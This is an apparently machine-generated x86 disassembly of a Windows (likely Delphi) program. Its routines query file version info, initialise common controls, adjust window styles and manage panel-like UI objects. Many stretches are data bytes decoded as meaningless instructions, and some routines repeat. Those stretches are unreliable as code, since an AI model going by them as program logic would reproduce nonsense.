lea eax [ ebp - 0x10 ]
push eax
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov [ rw-data ] eax
sub_4735f0
sub al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + esi * 2 ] cl
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax + esi * 2 + 0x41 ] ah
popad
jns r-xdata
insd
add [ esi * 2 + 0x3cc00041 ] al
dec eax
add [ esp + esi * 2 + 0x74c00041 ] bh
inc ecx
add ah bh
jo r-xdata
aam 0x36
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
inc edi
insd
popad
dec ecx
outsb
js r-xdata
inc edi
add [ ebp + ecx * 8 + 0x46 ] al
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
insb
jae r-xdata
add [ eax + 0x71 ] bh
inc ecx
add [ ecx + ebx * 8 + 0x46 ] ah
add [ eax ] dh
cmp eax 0x540d0048
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
imul eax [ ecx ] 0x70
imul eax [ ecx ] 0x64
jo r-xdata
0x1c0044 0xff00
dec eax
add [ ecx + ecx * 2 + 0x48 ] ch
add [ eax + 0x38004180 ] dh
add [ ecx ] sub_484980
add [ edx + 0x45dc0041 ] 0x48
add [ eax ] al
inc esi
dec eax
add ah ch
jne r-xdata
add [ edi + esi + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
aaa
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
aaa
inc edi
add [ eax ] bl
add [ eax ] al
add [ eax ] ch
0x39080042 0x40
je r-xdata
inc ebp
add [ eax ] al
jne r-xdata
enter 0x4849 0x0
adc dl [ ebx + eax * 2 + 0x6f ]
add [ eax ] dh
inc esi
dec eax
add [ edi + eax * 2 ] ah
dec eax
add [ eax ] dh
inc edi
dec eax
add [ edx + edi * 2 ] dh
inc ecx
add al dl
dec eax
dec eax
add [ ecx + ecx * 2 ] bl
dec eax
add [ edi * 2 + 0x49240041 ] al
cmp [ eax ] eax
adc [ ecx ] bh
inc eax
add [ eax + 0x36 ] bl
inc eax
insd
jae r-xdata
add [ esi + esi + 0x40 ] dh
add ah dh
inc esi
dec eax
add [ eax + 0x6b ] ch
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmp [ edi ] eax
add [ eax ] al
js r-xdata
inc edx
add [ eax + 0x7d ] ch
inc ecx
add [ ebp + edi * 2 + 0x49380041 ] bh
dec eax
add ah bh
jg r-xdata
dec eax
add [ eax ] bh
jge r-xdata
and al 0x49
add [ eax + 0x49 ] bl
add [ eax ] ch
add [ eax ] al
add [ eax + 0x80046cc ] bh
cmp [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ esi ] 0x47
js r-xdata
rcl ah 0x36
inc edi
add [ edi ] al
or eax 0x6d6f4354
bound ebp [ edi + 0x45 ]
inc ecx
add [ edi + esi * 2 + 0x76a40041 ] ah
inc ecx
add [ eax + ecx * 2 + 0x48 ] bh
add [ eax - 0x53ffb7b8 ] ah
dec eax
dec eax
add [ eax - 0x77ffb7b8 ] bh
jpe r-xdata
jae r-xdata
insd
sbb al 0x39
je r-xdata
push 0x94004739
cmp [ edi ] eax
cwde
je r-xdata
add al [ eax ]
add [ eax - 0x15 ] al
inc edx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
js r-xdata
or al 0xeb
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax + eax * 4 + 0x41 ] dl
add al ch
add [ ecx ] 0xc0
dec ecx
dec eax
add al cl
dec ecx
dec eax
add [ edx ] dl
push esp
inc ebx
outsd
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0x42600041 0x44
inc eax
add [ ecx + edi ] bl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ esi + esi + 0x40 ] dh
add ah al
dec eax
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 + 0x37040041 ] al
pushad
inc esp
add [ eax + 0x36 ] bl
inc eax
outsd
js r-xdata
imul ebp [ esi + 0x67 ] 0x37e49073
inc edi
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
loop r-xdata
je r-xdata
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + edi ] dl
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x2800473a
add [ eax ] al
add al dl
salc
inc esi
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
js r-xdata
dec eax
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x40b40044
dec eax
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ edi + edi + 0x48 ] bh
add [ esi + edx * 2 + 0x424c0044 ] ah
dec eax
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ esi + ebp + 0x43 ] ch
add [ eax + 0x45 ] dl
dec eax
add [ eax + 0x4004484 ] bl
arpl [ eax + eax + 0x54 ] ax
add [ eax + eax + 0x4 ] 0x88004484
cmp [ ebx ] eax
sbb al 0x2f
inc ebx
add [ eax + 0x2f ] cl
inc ebx
add [ ecx + edi + 0x2e400043 ] bl
adc al 0x3e
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
inc ebx
add ah bh
inc eax
dec eax
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
inc ecx
add [ edi + esi ] al
inc edx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
imul ebp [ esi + 0x67 ] 0x47374473
add [ ebx + ebp * 8 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x385c0040 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x47 ] ch
inc ebx
add ah al
cmp [ ebx ] al
sar [ eax ] 0x1
inc ebx
add [ ecx + edi + 0x43 ] bl
add ah bh
rol [ eax + eax - 0x70 ] cl
inc ebx
add ah ah
aaa
inc ebx
add [ eax + 0x31 ] ch
inc ebx
add [ eax + 0x48004844 ] bl
inc ebp
dec eax
add [ edi + ebp + 0x448c0043 ] al
dec eax
add [ eax * 2 + 0x38a00048 ] cl
inc ebx
add [ edi ] al
add bh ch
dec [ 0x4eb009b0 ]
mov esp 0x201ffd9
mov ch 0xff
test al 0x44
dec eax
add [ ecx + eax * 2 + 0x48 ] dl
add [ ecx + eax * 2 ] ch
dec eax
add [ edi + edi ] ch
dec eax
add [ eax - 0x4bffb7bc ] ah
inc ecx
dec eax
add [ eax + 0x11004845 ] ah
push esp
inc ebx
jne r-xdata
shr [ ecx + edi + 0x11070047 ] 0x54
inc ebx
jne r-xdata
0xcc80041 0x44
je r-xdata
add [ edx + ebp * 8 ] dh
inc ecx
add al cl
or al 0x44
add [ eax ] ch
jecxz r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
or eax 0xe1f00044
inc esp
add [ edx + eax * 2 + 0xe040044 ] cl
inc esp
add [ esi + ecx + 0x44 ] al
add [ eax ] dh
or eax 0xe2040044
inc esp
add [ eax ] cl
loop r-xdata
add [ ebp + ecx + 0x44 ] dh
add [ eax + 0x4c0041e9 ] bh
0xeac00041 0x41
inc eax
add [ eax ] bl
cmp [ eax ] eax
add [ ecx + edi ] dl
js r-xdata
add [ edx + 0x74 ] dh
add bh bh
add [ ebp + ecx + 0x44 ] dl
add ah al
or al [ eax + eax - 0x18 ]
loop r-xdata
add dl ch
inc ecx
add [ eax + 0x42 ] ah
inc esp
cmp [ edi ] al
clc
in al dx
inc edx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
js r-xdata
add [ ebx + 0x46 ] ch
add ah bh
loop r-xdata
inc esp
add [ ecx ] ch
inc esp
add [ eax ] ch
or al 0x44
add [ ecx + 0x44 ] dl
add [ edx + eax * 2 + 0xda00044 ] al
inc esp
add [ esp + ecx + 0x44 ] bl
add [ ecx - 0x1e47ffbc ] ah
inc esp
add [ esp + ecx - 0x1e1fffbc ] dl
inc esp
add al dh
or al 0x44
add al ch
loope r-xdata
insb
jae r-xdata
dec eax
add [ eax ] al
jne r-xdata
add [ ebx - 0x7d ] dl
add al 0x24
or [ eax ] al
add al bl
jecxz r-xdata
add [ 0x6d6f4354 ] dl
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] dl
add [ eax ] ah
cmp al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ebx [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c1b
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
mov esi eax
push esi
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
add [ eax ] al
mov [ esp + 0x4 ] eax
mov eax esp
call sub_428edc
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
add [ eax - 0x1b ] ah
inc esi
add ah ah
dec ebx
dec eax
add [ ebx + ecx * 2 + 0x48 ] dh
js r-xdata
mov eax ebx
call sub_402744
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_473bf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
push esi
call GetFileVersionInfoA
test eax eax
je r-xdata
jne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xffffc08b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402764
retn
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov [ rw-data ] eax
sub_473ae8
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_428edc
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_473b14
push ebx
mov ebx eax
mov eax ebx
call sub_473ae8
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_473b3c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473c14
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c1b
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
mov esi eax
push esi
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_402744
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_473bf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
push esi
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402764
retn
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov [ rw-data ] eax
sub_473c40
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_448788
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_448484
push eax
call GetWindowLongA
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_448484
push eax
call SetWindowLongA
sub_473c88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_416ddc
mov eax esi
call sub_473d88
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_473ce4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416a84
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_473e94
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_473ebc
mov edx [ edi + 0x14 ]
mov eax ebx
call sub_473e68
mov edx [ edi + 0x18 ]
mov eax ebx
call sub_473e44
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_473e14
mov dl [ edi + 0x1d ]
mov eax ebx
call sub_473e84
mov al [ edi + 0x1e ]
mov [ ebx + 0x1e ] al
mov edx [ edi + 0x20 ]
mov eax ebx
call sub_473f04
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_473d88
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4038bc
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_4038bc
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_473d5c
mov [ ebx + 0x25 ] 0x1
sub_473df0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_404480
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416e80
sub_473e24
push esi
mov esi eax
cmp dl [ esi + 0x1f ]
je r-xdata
pop esi
retn
mov [ esi + 0x1f ] dl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_4038bc
sub_473e94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_404828
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_404480
xor edx edx
mov eax ebx
call sub_416e44
sub_473ebc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x18 ]
cmp edx eax
jle r-xdata
mov edx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
mov edx eax
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_416e68
mov esi eax
mov eax [ ebx + 0x4 ]
call sub_4171e4
dec eax
cmp esi eax
setl dl
mov eax ebx
call sub_416e44
sub_473f14
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_416fc0
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_473f7c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_474788
pop esi
pop ebx
retn
mov eax esi
call sub_416e68
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_474764
pop esi
pop ebx
retn
sub_473fa8
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
jne r-xdata
mov esi edx
test edx edx
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov esi eax
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_4171e4
cmp edi eax
jge r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
call sub_4171e4
mov edi eax
dec edi
sub_473ff8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444294
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_441278
mov edx 0x11
mov eax ebx
call sub_441544
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov esi eax
mov [ ebx + 0x214 ] esi
mov eax esi
mov edx ebx
call sub_440940
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x224 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_474fa8
mov [ ebx + 0x220 ] 0x1
mov [ ebx + 0x222 ] 0x0
mov [ ebx + 0x211 ] 0x0
mov [ ebx + 0x210 ] 0x0
xor eax eax
mov [ ebx + 0x20c ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4740c8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x214 ]
call sub_4036c0
mov eax [ esi + 0x208 ]
call sub_4036c0
mov eax [ esi + 0x224 ]
call sub_4036c0
mov eax [ esi + 0x20c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
test bl bl
jle r-xdata
call sub_4036c0
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_474120
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_473ae8
mov edx esi
mov eax ebx
call sub_4453e0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44530c
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x221 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
cmp [ ebx + 0x222 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x40
sub_474198
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_417110
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474220
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b6a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_419f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_47424c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44550c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x228 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_474788
push ebp
call sub_474198
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_44ef40
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
pop edx
call sub_428ff4
pop ebx
pop ecx
pop ebp
retn
sub_4742b4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_474342
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_41c1f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474349
mov eax [ ebp - 0x8 ]
call sub_4036c0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_418900
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_474358
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44784c
mov eax ebx
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4171e4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_473f64
call sub_473d88
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_473f64
cmp [ eax + 0x25 ] 0x0
je r-xdata
sub_4743b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_441768
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_473f64
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_473f14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4744fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_473f64
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474505
mov eax [ ebp - 0x10 ]
call sub_4036c0
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_473f58
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_473f64
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_473f64
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_473f64
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_474505
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4171e4
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_474788
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4171e4
mov edx eax
dec edx
mov eax ebx
call sub_473f64
mov edx [ ebp - 0x8 ]
call sub_473ebc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_473f64
mov edx [ ebp - 0xc ]
call sub_473ebc
sub_474560
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x214 ]
call sub_422084
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4745dc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_474668
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov esi eax
mov edx ecx
mov eax [ esi + 0x208 ]
call sub_473f64
mov ebx eax
lea eax [ esp + 0x1 ]
xor ecx ecx
mov edx 0x24
call sub_402fc4
mov [ esp + 0x1 ] 0x7
mov eax [ ebx + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax [ ebx + 0xc ]
call sub_4048dc
mov [ esp + 0x9 ] eax
mov eax [ ebx + 0xc ]
call sub_4046e4
mov [ esp + 0x11 ] eax
mov al [ ebx + 0x1c ]
mov [ esp ] al
mov eax ebx
call sub_473dd8
test al al
je r-xdata
mov al [ esp ]
sub al 0x1
jb r-xdata
mov eax esp
call sub_43eb7c
xor eax eax
mov [ esp + 0x15 ] eax
jmp r-xdata
je r-xdata
cmp [ ebx + 0x1d ] 0x1
jne r-xdata
mov [ esp + 0x15 ] 0x1
jmp r-xdata
jmp r-xdata
or [ esp + 0x15 ] 0x4000
or [ esp + 0x15 ] 0x8000
jmp r-xdata
mov [ esp + 0x15 ] 0x2
cmp [ esi + 0x228 ] 0x0
je r-xdata
or [ esp + 0x15 ] 0x4
mov eax ebx
call sub_473dc0
test al al
je r-xdata
lea eax [ esp + 0x1 ]
push eax
